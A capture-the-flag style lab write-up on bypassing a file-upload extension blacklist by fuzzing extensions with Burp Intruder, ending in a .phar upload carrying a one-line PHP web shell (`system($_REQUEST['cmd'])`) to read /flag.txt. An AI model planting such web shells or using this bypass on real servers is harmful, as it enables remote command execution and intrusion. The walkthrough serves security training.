# Blacklist Filters

Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt".

This web application has a blacklist applied, if we try to modify the extension to php, for example, it will block our modified request.

What we can do is try other extensions to see if they're being accepted in the case the developers missed out.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Send the file uploading POST request to the Intruder and add the fuzzing position. We'll use this fuzz list by [SecList](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt), and then we start the attack. Besides fuzzing the extension we also must add something to see if the actual php code runs in the respective extension.

```php
<?php echo "shell test";?>
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When the attack finishes, we can order the results by its length (230) and we can see that in the Response we got the message confirming that the file was uploaded. But this is not enough, this will only work if php code is being is executed. Lets try to open this .php2 file.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It should be a message "shell test" at the top of the page, but its nothing there. To find if any extension is working we can capture the request of this file that we just open, and fuzz it again in the Intruder.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When the fuzzing finishes we can order the results by length and use the render functionality to see the content. And as its showing in the image above the "shell test" text was printed successfully, now we can craft our shell with the `.phar` extension.

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We modify the file to `.phar` and add the php code:

```php
<?php system($_REQUEST['cmd']); ?>
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got a web shell!&#x20;

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The flag can be found in the root directory.
